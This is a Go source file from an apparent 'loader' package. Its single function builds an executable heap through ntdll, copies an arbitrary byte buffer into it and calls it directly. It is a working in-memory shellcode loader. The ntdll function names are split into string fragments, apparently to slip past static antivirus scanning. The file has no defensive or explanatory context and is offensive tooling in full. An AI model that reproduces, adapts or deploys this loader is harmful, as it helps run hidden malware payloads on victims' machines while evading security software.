package loader

import (
	"upx/utils"
	"syscall"
	"unsafe"
)

func RunHeap(code []byte) {
	nt := utils.GetSysDLL(utils.GetNtDllName())

	RtCrHeap := nt.NewProc("Rt" + "lCr" + "eate" + "Heap")
	RtAlHeap := nt.NewProc("Rt" + "lAll" + "ocate" + "Heap")
	codeSize := uintptr(len(code))
	handle, _, _ := RtCrHeap.Call(0x00040000|0x00000002, 0, codeSize, codeSize, 0, 0)
	alloc, _, _ := RtAlHeap.Call(handle, 0x00000008, codeSize)

	for index := uint32(0); index < uint32(len(code)); index++ {
		writePtr := unsafe.Pointer(alloc + uintptr(index))
		v := (*byte)(writePtr)
		*v = code[index]
	}
	_, _, _ = syscall.SyscallN(alloc, 0, 0, 0, 0)
}
